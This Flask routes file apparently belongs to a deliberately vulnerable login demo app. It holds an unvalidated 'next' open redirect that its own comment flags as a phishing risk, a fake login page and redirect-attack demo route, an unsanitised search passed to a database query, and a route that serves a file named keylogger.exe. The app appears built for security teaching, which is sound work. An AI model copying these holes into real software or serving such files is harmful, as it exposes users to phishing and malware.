from flask import render_template, request, redirect, send_file
from flask_login import login_required, login_user, logout_user, current_user

from LoginSystems.AverageLoginSystem import app, databaseManager

@app.route('/')
def homePage():
    return render_template('home.html')

@app.route('/createAccount', methods=["GET", "POST"])
def createAccount():
    if (current_user.is_authenticated):
        return redirect('/')

    if request.method == 'POST':
        # creating new acct
        username = request.form.get('Username')
        password = request.form.get('Password')

        user = databaseManager.addUser(username, password)
        if type(user) == str: # error
            return render_template("createAccount.html", error=user)
        else:
            login_user(user)
            return redirect('/')

    return render_template('createAccount.html', error=False)

@app.route('/login', methods=['GET', 'POST'])
def login():
    # TODO: this 'next' is EXTREMELY unsafe. An attacker could use this to redirect victims a new phising website upon login
    next = request.args.get('next')
    if (current_user.is_authenticated):
        return redirect(next or '/')

    if request.method == "POST":
        username = request.form.get('Username')
        password = request.form.get('Password')

        if databaseManager.loginUser(username, password):
            return redirect(next or '/')

    return render_template("loginPage.html")

@app.route('/logout')
def logout():
    logout_user()
    return redirect('/')

@app.route('/secret')
@login_required
def secret():
    return "success!"


@app.route('/search', methods=['GET', 'POST'])
def search():
    search = False
    results = []
    query = ""
    if request.method == 'POST':
        query = request.form.get('query')
        results = databaseManager.query(query)
        search=True

    return render_template('searchPage.html', search=search, results=results, query=query)

@app.route('/answerPage')
def answerPage():
    return render_template('answers.html')


@app.route('/redirectAttack')
def redirectAttack():
    return render_template('redirectAttack.html')

@app.route('/fakeLoginPage', methods=['GET','POST'])
def fakeLoginPage():
    if request.method == 'POST':
        return redirect('https://en.wikipedia.org/wiki/URL_redirection')

    return render_template('fakeLoginPage.html')


@app.route('/downloadFile')
def downloadFile():
    return send_file("../keylogger.exe", as_attachment=True)